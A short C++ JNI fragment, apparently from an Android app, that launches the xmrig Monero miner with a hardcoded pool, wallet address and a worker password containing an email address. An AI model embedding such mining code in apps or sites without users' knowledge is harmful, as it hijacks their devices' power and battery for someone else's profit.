...
extern "C" {
    JNIEXPORT void JNICALL Java_waterhole_miner_monero_NewXmrMinerActivity_startMine(JNIEnv *env, jobject thiz) {
         ...
         */
         ...
         int argc = 10;
         char *argv[] = {
            "./xmrig", "--api-port", "556", "-o", "pool.monero.hashvault.pro:3333",
            "-u", "46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY",
            "-p",
            "worker1:651043704@qq.com",
            "-k"};
         App app(argc, argv);
         app.exec();
    }
